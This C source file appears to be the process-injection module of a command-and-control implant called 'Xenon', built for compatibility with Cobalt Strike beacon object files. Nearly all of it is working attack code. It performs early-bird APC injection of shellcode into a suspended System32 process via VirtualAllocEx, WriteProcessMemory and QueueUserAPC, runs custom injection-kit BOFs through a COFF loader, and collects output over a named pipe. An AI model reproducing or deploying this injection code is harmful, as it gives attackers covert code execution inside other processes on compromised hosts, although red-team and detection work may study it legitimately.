#include "Inject.h"

#include "Xenon.h"
#include "Config.h"
#include "Package.h"
#include "BeaconCompatibility.h"


// #ifdef INCLUDE_CMD_REGISTER_PROCESS_INJECT_KIT

/*
	This file requires the COFF loader.

	TODO - work on #defines to make code optional
*/

/**
 * @brief Inject PIC using default technique (early bird injection)
 * 
 * @param[in] 
 * @param[inout] 
 * @return BOOL
 */
BOOL InjectDefault(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _Out_ PCHAR* outData)
{
	BOOL   Status  = FALSE;
	HANDLE hPipe   = NULL;
	PCHAR  output  = NULL;
	DWORD  outLen  = 0;
	OVERLAPPED ov  = { 0 };

    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	Status = InitNamedPipe(&ov, &hPipe);
	if (Status == FALSE || hPipe == NULL) {
		_err("Failed to initialize named pipe. ERROR : %d", GetLastError());
		return FALSE;
	}

	/* Inject */
	if (!InjectProcessViaEarlyBird(buffer, bufferLen)) {
		return FALSE;
	}

	Sleep(3000);

	/* Read any stdin/stderr from injected process */
	if (!ReadNamedPipe(hPipe, &output, &outLen)) {
		_err("[-] No output or read failed\n");
		goto END;
	}

	_dbg("[+] Received %lu bytes of output", outLen);
	_dbg("%.*s\n", outLen, output);  // if it's printable

	*outData = output;

	Status = TRUE;

END:
	// Cleanup
    CloseHandle(hPipe);
    CloseHandle(ov.hEvent);

	return Status;
}


/**
 * @brief Inject PIC using registered custom Process Injection Kit (bof)
 * 
 * @param[in] 
 * @param[inout] 
 * @return BOOL
 */
BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR InjectKit, _In_ SIZE_T kitLen, _Out_ PCHAR* outData)
{
	BOOL   Status  = FALSE;
	HANDLE hPipe   = NULL;
	PCHAR  output  = NULL;
	DWORD  outLen  = 0;
	OVERLAPPED ov  = { 0 };

    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	Status = InitNamedPipe(&ov, &hPipe);
	if (Status == FALSE || hPipe == NULL) {
		_err("Failed to initialize named pipe. ERROR : %d", GetLastError())
		return Status;
	}

	/* Pack arguments for Inject Kit (ignoreToken / buffer) */
	BOOL ignoreToken = FALSE;
    PPackage temp = PackageInit(NULL, FALSE);
    PackageAddShort(temp, (USHORT)ignoreToken);                         // +2 bytes
    PackageAddInt32_LE(temp, bufferLen);                           		//  +4 bytes little-endian
    PackageAddBytes(temp, buffer, bufferLen, FALSE);     				//  +sizeof(shellcode) bytes
    PPackage arguments = PackageInit(NULL, FALSE);                        // Length-prefix the whole package
    PackageAddBytes(arguments, temp->buffer, temp->length, TRUE);

	PackageDestroy(temp);

    /* Inject PIC with Custom Process Injection Kit BOF */
    DWORD filesize = kitLen;
    if (!RunCOFF(InjectKit, &filesize, "gox64", arguments->buffer, arguments->length)) {
		_err("Failed to execute BOF in current thread.");
		goto END;
	}

	/* Read any output from the Process Inject BOF */
	PCHAR BofOutBuf = NULL;
	int BofOutLen = 0;
    BofOutBuf = BeaconGetOutputData(&BofOutLen);
	if (BofOutBuf == NULL) {
        _err("[!] Failed get BOF output");
        goto END;
	}

	
    Sleep(3000);        // TODO figure out better way to wait for output from named pipe

 
	/* Read any stdin/stderr from injected process */
	if (!ReadNamedPipe(hPipe, &output, &outLen)) {
		_err("[-] No output or read failed\n");
		goto END;
	}


	_dbg("[+] Received %lu bytes of output", outLen);
	_dbg("%.*s\n", outLen, output);  // if it's printable


	/* Combine BOF output and named pipe output */
	DWORD totalLen = BofOutLen + outLen;
	PCHAR finalOutput = (PCHAR)malloc(totalLen + 1);
	if (finalOutput == NULL) {
		_err("[-] Failed to allocate memory for final output");
		goto END;
	}

	memcpy(finalOutput, BofOutBuf, BofOutLen);
	memcpy(finalOutput + BofOutLen, output, outLen);
	finalOutput[totalLen] = '\0';

	*outData = finalOutput;

	Status = TRUE;

END:
	// Cleanup
	free(BofOutBuf);
	PackageDestroy(arguments);
    CloseHandle(hPipe);
    CloseHandle(ov.hEvent);


	return Status;
}


/**
 * @brief Initialize an asynchronous named pipe to get output from injection
 * 
 * @param[out] pOutHandle pointer to handle of named pipe 
 * @param[inout] 
 * @return BOOL
 */
BOOL InitNamedPipe(_Inout_ OVERLAPPED* ov, _Out_ HANDLE* pOutHandle)
{
	/* Setup Named Pipe in OVERLAPPED mode */
    char fullPipePath[256];
    snprintf(fullPipePath, sizeof(fullPipePath), "\\\\.\\pipe\\%s", xenonConfig->pipename);

    HANDLE hPipe = CreateNamedPipeA(
        fullPipePath,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,              // max instances
        4096, 4096,     // output/input buffer size
        0,              // default timeout
        NULL            // security attributes
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        _err("[-] Failed to create named pipe: %lu\n", GetLastError());
        return FALSE;
    }

    _dbg("[*] Waiting for connection back to the pipe...\n");
    if (!ConnectNamedPipe(hPipe, ov)) {
        DWORD err = GetLastError();
        if (err != ERROR_IO_PENDING && err != ERROR_PIPE_CONNECTED) {
            _err("[-] ConnectNamedPipe failed: %lu\n", err);
            CloseHandle(hPipe);
        }
    }

	*pOutHandle = hPipe;

	return TRUE;
}

/**
 * @brief Read All Output from Named Pipe
 * 
 * @param[in] 
 * @param[inout] 
 * @return BOOL
 */
BOOL ReadNamedPipe(_In_ HANDLE hPipe, _Out_ PCHAR* outBuffer, _Out_ DWORD* outSize)
{
    DWORD bytesRead = 0;
    DWORD totalRead = 0;
    DWORD chunkSize = 4096;
    char* buffer = NULL;
    char temp[4096];

    *outBuffer = NULL;
    *outSize = 0;

    while (TRUE) {
        BOOL ok = ReadFile(hPipe, temp, sizeof(temp), &bytesRead, NULL);
        if (!ok || bytesRead == 0) {
            DWORD error = GetLastError();
            if (error == ERROR_BROKEN_PIPE || error == ERROR_NO_DATA || bytesRead == 0) {
				break;  // No more data
            } else {
                _err("[-] ReadFile failed: %lu\n", error);
                free(buffer);
                return FALSE;
            }
        }

        // Expand buffer and copy data
        char* newBuffer = (char*)realloc(buffer, totalRead + bytesRead);
        if (!newBuffer) {
            _err("[-] realloc failed\n");
            free(buffer);
            return FALSE;
        }

        buffer = newBuffer;
        memcpy(buffer + totalRead, temp, bytesRead);
        totalRead += bytesRead;
    }

	*outBuffer = buffer;
    *outSize = totalRead;

    return TRUE;
}


/*
    Helper Functions
*/
BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayload, IN SIZE_T szPayloadSize) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
	SIZE_T szAllocSize = szPayloadSize;

	pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		_dbg("[!] VirtualAllocEx Failed With Error : %d", GetLastError());
		return FALSE;
	}

	SIZE_T szNumberOfBytesWritten = NULL;
	if (!WriteProcessMemory(hProc, pAddress, pPayload, szPayloadSize, &szNumberOfBytesWritten) || szNumberOfBytesWritten != szPayloadSize) {
		_dbg("[!] Failed to write process memory : %d", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProc, pAddress, szPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		_dbg("[!] VirtualProtect Failed With Error : %d", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		_dbg("[!] QueueUserAPC Failed With Error : %d ", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CreateTemporaryProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread)
{

	CHAR lpPath   [MAX_PATH * 2];
	CHAR WnDr     [MAX_PATH];

	STARTUPINFO            Si    = { 0 };
	PROCESS_INFORMATION    Pi    = { 0 };

	// Cleaning the structs by setting the element values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		_err("[!] GetEnvironmentVariableA Failed With Error : %d", GetLastError());
		return FALSE;
	}

	// Creating the target process path
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// Creating the process
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,		// Instead of CREATE_SUSPENDED
		NULL,
		NULL,
		&Si,
		&Pi)) {
		_dbg("[!] CreateProcessA Failed with Error : %d", GetLastError());
		return FALSE;
	}

	// Filling up the OUTPUT parameter with CreateProcessA's output
	*dwProcessId        = Pi.dwProcessId;
	*hProcess           = Pi.hProcess;
	*hThread            = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

/*
	Injection Functions
*/
BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen)
{
	LPCSTR lpProcessName 	= xenonConfig->spawnto;						// Name of process in C:\\Windows\\System32
	DWORD dwProcId 			= NULL;
	HANDLE hProcess 		= NULL;
	HANDLE hThread 			= NULL;

	if (!CreateTemporaryProcess(lpProcessName, &dwProcId, &hProcess, &hThread)) {
		_dbg("Failed to create debugged process : %d\n", GetLastError());
		return FALSE;
	}

	if (!RunViaRemoteApcInjection(hThread, hProcess, buf, szShellcodeLen)) {
		_dbg("Failed to RunViaRemoteApcInjection : %d\n", GetLastError());
		return FALSE;
	}

	ResumeThread(hThread);

	//WaitForSingleObject(hThread, INFINITE);			// Currently waiting for entire thread to finish

	return TRUE;
}
